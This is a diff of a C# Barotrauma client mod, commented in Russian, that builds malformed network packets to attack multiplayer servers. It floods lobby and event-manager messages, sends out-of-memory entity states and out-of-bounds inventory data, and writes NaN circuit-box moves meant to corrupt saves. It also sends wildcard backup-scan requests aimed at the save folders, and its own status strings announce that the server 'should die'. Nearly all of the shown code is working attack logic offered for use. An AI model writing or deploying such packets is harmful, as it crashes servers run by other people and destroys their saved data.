-            if (target == null) { return "предмет не найден"; }
-
-            IWriteMessage payload = new WriteOnlyMessage();
-            payload.WriteRangedInteger(3, 0, 12);                       // ChangeProperty
-            payload.WriteIdentifier("DescriptionTag".ToIdentifier());
-            payload.WriteString("zzz_crash_tag_raw");
-            SendSweep(target.ID, payload, Math.Min(n, 40));
-            return "raw ChangeProperty ×" + Math.Min(n, 40) + " на " + target.Name;
-        }
-
-        private static string ExecEventManager(int n)
-        {
-            if (!CanSend()) { return "нет подключения"; }
-            for (int i = 0; i < Math.Min(n, 50); i++)
+            int sent = 0;
+            for (int i = 0; i < Math.Min(n, 1000); i++)
             {
                 IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
-                msg.WriteUInt16(0x7FFF);
-                msg.WriteByte(200);
+                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
+                msg.WriteInt32(int.MaxValue);
+                msg.WriteUInt16(0);
+                msg.WriteUInt16(0);
                 GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+                sent++;
             }
-            return "EVENTMANAGER ×" + Math.Min(n, 50) + " (сработает при активном диалоге)";
+            return "SegmentTable ×" + sent;
         }
 
-        // ========================================================
-        //  ☣ CIRCUIT BOX: прямой API (как рабочий Lua)
-        // ========================================================
-        private static string ExecLabelFlood(int n)
-        {
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
-            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
-
-            int created = 0;
-            var rand = new Random();
-            n = Math.Min(n, 10000);
-            for (int i = 0; i < n; i++)
-            {
-                try
-                {
-                    cb.AddLabel(new Vector2(rand.Next(-5000, 5000), rand.Next(-5000, 5000)));
-                    created++;
-                }
-                catch { break; }
-            }
-            return "LABEL FLOOD: " + created + " меток на «" + item.Name + "» (персистятся в сейв!)";
-        }
-
-        private static string ExecRenameChaos(int n)
-        {
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
-            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
-
-            int renamed = 0;
-            try
-            {
-                int i = 0;
-                foreach (CircuitBoxLabelNode label in cb.Labels)
-                {
-                    if (label == null) { continue; }
-                    i++;
-                    try
-                    {
-                        cb.RenameLabel(label, new Color(255, 0, 0, 255),
-                            new NetLimitedString("HACKED#" + i),
-                            new NetLimitedString("System compromised!"));
-                        renamed++;
-                        if (renamed >= n) { break; }
-                    }
-                    catch { }
-                }
-            }
-            catch (Exception e) { return "rename fail: " + e.Message; }
-            return "RENAME CHAOS: " + renamed + " меток в «" + item.Name + "»";
-        }
-
-        private static string ExecWireChaos(int n)
-        {
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
-            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
-
-            int created = 0;
-            int cap = Math.Min(n, 2000);
-            try
-            {
-                for (int i = 0; i < cb.Inputs.Length && created < cap; i++)
-                {
-                    for (int j = 0; j < cb.Outputs.Length && created < cap; j++)
-                    {
-                        try
-                        {
-                            cb.AddWire(cb.Inputs[i], cb.Outputs[j]);
-                            created++;
-                        }
-                        catch { }
-                    }
-                }
-            }
-            catch (Exception e) { return "wire fail: " + e.Message; }
-            return "WIRE CHAOS: " + created + " проводов на «" + item.Name + "» (персистятся!)";
-        }
-
-        // ========================================================
-        //  [DOS] методы
-        // ========================================================
         private static string ExecSoldPrefab(int n)
         {
             if (!CanSend()) { return "нет подключения"; }
@@ -683,124 +722,7 @@ namespace CSHUB.Modules
                 GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                 sent++;
             }
-            return "SoldItems-бомба ×" + sent;
-        }
-
-        private static string ExecEntityStateOom(int n)
-        {
-            if (!CanSend()) { return "нет подключения"; }
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            ushort myId = Character.Controlled.ID;
-
-            IWriteMessage msg = new WriteOnlyMessage();
-            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
-            msg.WriteBoolean(true);
-            msg.WritePadBits();
-            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
-            {
-                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
-                msg.WritePadBits();
-                msg.WriteUInt16(RealNextEventId());
-                msg.WriteByte((byte)Math.Min(n, 255));
-                for (int i = 0; i < Math.Min(n, 255); i++)
-                {
-                    msg.WriteUInt16(myId);
-                    msg.WriteVariableUInt32(0x40000000u);
-                    msg.WriteUInt16(0);
-                }
-            }
-            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "OOM ×" + Math.Min(n, 255) + " в одном пакете";
-        }
-
-        private static string ExecInventoryOob(int n)
-        {
-            if (!CanSend()) { return "нет подключения"; }
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Character me = Character.Controlled;
-            Item container = null; float bd = 400f;
-            foreach (Item it in Item.ItemList)
-            {
-                if (it == null || it.Removed) { continue; }
-                bool isC = false;
-                try { isC = it.GetComponent<ItemContainer>() != null; } catch { }
-                if (!isC) { continue; }
-                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
-                if (d < bd) { bd = d; container = it; }
-            }
-            if (container == null) { return "рядом нет контейнера"; }
-
-            IWriteMessage payload = new WriteOnlyMessage();
-            payload.WriteRangedInteger(1, 0, 12);                       // InventoryState
-            int comps = 1;
-            try { comps = Math.Max(1, container.Components.Count); } catch { }
-            payload.WriteRangedInteger(0, 0, comps - 1);
-            payload.WriteByte(0);
-            payload.WriteByte(255);
-            for (int i = 0; i < 96; i++) { payload.WriteByte(0); }
-
-            SendSweep(container.ID, payload, Math.Min(Math.Max(n, 1), 40));
-            return "Inventory-бомба на «" + container.Name + "»";
-        }
-
-        private static string ExecCircuitBoxNaN(int n)
-        {
-            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
-            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
-            if (item == null || cb == null) { return "нет circuit box"; }
-
-            var ids = new List<ushort>();
-            try
-            {
-                foreach (CircuitBoxComponent comp in cb.Components)
-                {
-                    if (comp != null && comp.ID != ICircuitBoxIdentifiable.NullComponentID) { ids.Add(comp.ID); }
-                }
-            }
-            catch { }
-            if (ids.Count == 0) { return "в цепи нет компонентов"; }
-
-            int cbIndex = 0;
-            try
-            {
-                for (int i = 0; i < item.Components.Count; i++)
-                {
-                    if (item.Components[i] is CircuitBox) { cbIndex = i; break; }
-                }
-            }
-            catch { }
-
-            IWriteMessage payload = new WriteOnlyMessage();
-            payload.WriteRangedInteger(0, 0, 12);
-            int comps = Math.Max(1, item.Components.Count);
-            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
-            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);
-            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
-                ImmutableArray.Create<ushort>(ids.ToArray()),
-                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
-                ImmutableArray.Create<ushort>(ids.ToArray()),
-                new Vector2(float.NaN, float.NaN));
-            ((INetSerializableStruct)move).Write(payload);
-
-            SendSweep(item.ID, payload, Math.Min(Math.Max(n, 1), 40));
-            return "NaN ×" + ids.Count + " узлов «" + item.Name + "» ★ СЕЙВ!";
-        }
-
-        private static string ExecSegmentTable(int n)
-        {
-            if (!CanSend()) { return "нет подключения"; }
-            int sent = 0;
-            for (int i = 0; i < Math.Min(n, 1000); i++)
-            {
-                IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
-                msg.WriteInt32(int.MaxValue);
-                msg.WriteUInt16(0);
-                msg.WriteUInt16(0);
-                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                sent++;
-            }
-            return "SegmentTable ×" + sent;
+            return "SoldItems ×" + sent;
         }
 
         private static string ExecCircuitBox(int n)
@@ -885,19 +807,278 @@ namespace CSHUB.Modules
             return "VOIP ×" + sent;
         }
 
+        // FIX: целься в папку сейвов с wildcard — сервер парсит каждый найденный бэкап
         private static string ExecBackupScan(int n)
         {
             if (!CanSend()) { return "нет подключения"; }
+            string[] targets =
+            {
+                "Saves/Multiplayer/*",
+                "Saves/*",
+                "Multiplayer/*",
+                "*"
+            };
             int sent = 0;
-            for (int i = 0; i < Math.Min(n, 200); i++)
+            for (int round = 0; round < Math.Min(n, 100); round++)
+            {
+                foreach (string t in targets)
+                {
+                    IWriteMessage msg = new WriteOnlyMessage();
+                    msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
+                    msg.WriteString(t);
+                    GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+                    sent++;
+                }
+            }
+            return "Скан ×" + sent + " (папки сейвов: сервер декомпрессит каждый бэкап!)";
+        }
+
+        private static string ExecDescriptionTag(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Character me = Character.Controlled;
+            int done = 0;
+            var tried = new HashSet<ushort>();
+            foreach (Item it in me.HeldItems) { if (TryTag(it, tried)) { done++; } }
+            if (me.Inventory != null)
+            {
+                foreach (Item it in me.Inventory.AllItemsMod) { if (TryTag(it, tried)) { done++; } }
+            }
+            if (done == 0)
+            {
+                Item near = null; float bd = 300f;
+                foreach (Item it in Item.ItemList)
+                {
+                    if (it == null || it.Removed || tried.Contains(it.ID)) { continue; }
+                    float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
+                    if (d < bd) { bd = d; near = it; }
+                }
+                if (near != null && TryTag(near, tried)) { done++; }
+            }
+            return done > 0
+                ? "DescriptionTag на " + done + " предметах — сервер должен умереть"
+                : "доступный предмет не найден";
+        }
+
+        private static bool TryTag(Item it, HashSet<ushort> tried)
+        {
+            if (it == null || it.Removed || !tried.Add(it.ID)) { return false; }
+            try
+            {
+                it.DescriptionTag = "zzz_crash_tag_test";
+                return true;
+            }
+            catch { return false; }
+        }
+
+        private static string ExecDescriptionTagRaw(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Character me = Character.Controlled;
+            Item target = null;
+            foreach (Item it in me.HeldItems) { if (it != null && !it.Removed) { target = it; break; } }
+            if (target == null && me.Inventory != null)
+            {
+                foreach (Item it in me.Inventory.AllItemsMod) { if (it != null && !it.Removed) { target = it; break; } }
+            }
+            if (target == null) { return "предмет не найден"; }
+
+            IWriteMessage payload = new WriteOnlyMessage();
+            payload.WriteRangedInteger(3, 0, 12);
+            payload.WriteIdentifier("DescriptionTag".ToIdentifier());
+            payload.WriteString("zzz_crash_tag_raw");
+            SendSweep(target.ID, payload, Math.Min(Math.Max(n, 1), 40));
+            return "raw ChangeProperty sweep на " + target.Name;
+        }
+
+        private static string ExecEventManager(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            for (int i = 0; i < Math.Min(n, 50); i++)
             {
                 IWriteMessage msg = new WriteOnlyMessage();
-                msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
-                msg.WriteString("C:\\Windows");
+                msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
+                msg.WriteUInt16(0x7FFF);
+                msg.WriteByte(200);
                 GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-                sent++;
             }
-            return "Скан ФС ×" + sent;
+            return "EVENTMANAGER ×" + Math.Min(n, 50) + " (нужен активный диалог)";
+        }
+
+        private static string ExecLabelFlood(int n)
+        {
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
+            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
+            int created = 0;
+            var rand = new Random();
+            n = Math.Min(n, 10000);
+            for (int i = 0; i < n; i++)
+            {
+                try
+                {
+                    cb.AddLabel(new Vector2(rand.Next(-5000, 5000), rand.Next(-5000, 5000)));
+                    created++;
+                }
+                catch { break; }
+            }
+            return "LABEL FLOOD: " + created + " на «" + item.Name + "» (персист в сейв!)";
+        }
+
+        private static string ExecRenameChaos(int n)
+        {
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
+            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
+            int renamed = 0;
+            try
+            {
+                int i = 0;
+                foreach (CircuitBoxLabelNode label in cb.Labels)
+                {
+                    if (label == null) { continue; }
+                    i++;
+                    try
+                    {
+                        cb.RenameLabel(label, new Color(255, 0, 0, 255),
+                            new NetLimitedString("HACKED#" + i),
+                            new NetLimitedString("System compromised!"));
+                        renamed++;
+                        if (renamed >= n) { break; }
+                    }
+                    catch { }
+                }
+            }
+            catch (Exception e) { return "rename fail: " + e.Message; }
+            return "RENAME: " + renamed + " меток";
+        }
+
+        private static string ExecWireChaos(int n)
+        {
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
+            if (item == null || cb == null) { return "нет circuit box (открой ЦБ!)"; }
+            int created = 0;
+            int cap = Math.Min(n, 2000);
+            try
+            {
+                for (int i = 0; i < cb.Inputs.Length && created < cap; i++)
+                {
+                    for (int j = 0; j < cb.Outputs.Length && created < cap; j++)
+                    {
+                        try
+                        {
+                            cb.AddWire(cb.Inputs[i], cb.Outputs[j]);
+                            created++;
+                        }
+                        catch { }
+                    }
+                }
+            }
+            catch (Exception e) { return "wire fail: " + e.Message; }
+            return "WIRE: " + created + " проводов (персист!)";
+        }
+
+        private static string ExecEntityStateOom(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            ushort myId = Character.Controlled.ID;
+            int cnt = Math.Min(n, 255);
+
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
+            msg.WriteBoolean(true);
+            msg.WritePadBits();
+            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
+            {
+                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
+                msg.WritePadBits();
+                msg.WriteUInt16(RealNextEventId());
+                msg.WriteByte((byte)cnt);
+                for (int i = 0; i < cnt; i++)
+                {
+                    msg.WriteUInt16(myId);
+                    msg.WriteVariableUInt32(0x40000000u);
+                    msg.WriteUInt16(0);
+                }
+            }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "OOM ×" + cnt + " (эксперимент: окно ID ненадёжно)";
+        }
+
+        private static string ExecInventoryOob(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Character me = Character.Controlled;
+            Item container = null; float bd = 400f;
+            foreach (Item it in Item.ItemList)
+            {
+                if (it == null || it.Removed) { continue; }
+                bool isC = false;
+                try { isC = it.GetComponent<ItemContainer>() != null; } catch { }
+                if (!isC) { continue; }
+                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
+                if (d < bd) { bd = d; container = it; }
+            }
+            if (container == null) { return "рядом нет контейнера"; }
+
+            IWriteMessage payload = new WriteOnlyMessage();
+            payload.WriteRangedInteger(1, 0, 12);
+            int comps = 1;
+            try { comps = Math.Max(1, container.Components.Count); } catch { }
+            payload.WriteRangedInteger(0, 0, comps - 1);
+            payload.WriteByte(0);
+            payload.WriteByte(255);
+            for (int i = 0; i < 96; i++) { payload.WriteByte(0); }
+
+            SendSweep(container.ID, payload, Math.Min(Math.Max(n, 1), 40));
+            return "Inventory на «" + container.Name + "» (эксперимент)";
+        }
+
+        private static string ExecCircuitBoxNaN(int n)
+        {
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item item = SelectedOrNearestCircuitBox(out CircuitBox cb);
+            if (item == null || cb == null) { return "нет circuit box"; }
+            var ids = new List<ushort>();
+            try
+            {
+                foreach (CircuitBoxComponent comp in cb.Components)
+                {
+                    if (comp != null && comp.ID != ICircuitBoxIdentifiable.NullComponentID) { ids.Add(comp.ID); }
+                }
+            }
+            catch { }
+            if (ids.Count == 0) { return "в цепи нет компонентов"; }
+
+            int cbIndex = 0;
+            try
+            {
+                for (int i = 0; i < item.Components.Count; i++)
+                {
+                    if (item.Components[i] is CircuitBox) { cbIndex = i; break; }
+                }
+            }
+            catch { }
+
+            IWriteMessage payload = new WriteOnlyMessage();
+            payload.WriteRangedInteger(0, 0, 12);
+            int comps = Math.Max(1, item.Components.Count);
+            payload.WriteRangedInteger(cbIndex, 0, comps - 1);
+            payload.WriteByte((byte)CircuitBoxOpcode.MoveComponent);
+            CircuitBoxMoveComponentEvent move = new CircuitBoxMoveComponentEvent(
+                ImmutableArray.Create<ushort>(ids.ToArray()),
+                ImmutableArray.Create<CircuitBoxInputOutputNode.Type>(),
+                ImmutableArray.Create<ushort>(ids.ToArray()),
+                new Vector2(float.NaN, float.NaN));
+            ((INetSerializableStruct)move).Write(payload);
+
+            SendSweep(item.ID, payload, Math.Min(Math.Max(n, 1), 40));
+            return "NaN ×" + ids.Count + " узлов ★ СЕЙВ!";
         }
 
         private static string ExecSelectMode(int n)
@@ -908,7 +1089,7 @@ namespace CSHUB.Modules
             msg.WriteUInt16((ushort)ClientPermissions.SelectMode);
             msg.WriteUInt16(9999);
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "SelectMode 9999 отправлен";
+            return "SelectMode 9999 (нужен перм)";
         }
 
         private static string ExecLoadGarbage(int n)
@@ -922,7 +1103,7 @@ namespace CSHUB.Modules
             msg.WriteBoolean(false);
             msg.WritePadBits();
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "LoadCampaign мусор отправлен";
+            return "LoadCampaign мусор (нужно окно 586/соло)";
         }
 
         private static string ExecForceSave(int n)
@@ -935,7 +1116,7 @@ namespace CSHUB.Modules
             msg.WriteBoolean(true);
             msg.WriteBoolean(false);
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "Сейв отправлен (аутпост + ManageRound/окно) — порча зафиксирована";
+            return "Сейв отправлен — порча зафиксирована (аутпост +ManageRound/окно)";
         }
 
         private static void CloseWindow()
@@ -944,7 +1125,9 @@ namespace CSHUB.Modules
             _window = null;
             _list = null;
             _desc = null;
+            _noteBox = null;
             _repeatBox = null;
+            _selectedMethod = null;
         }
 
         public override void Dispose()
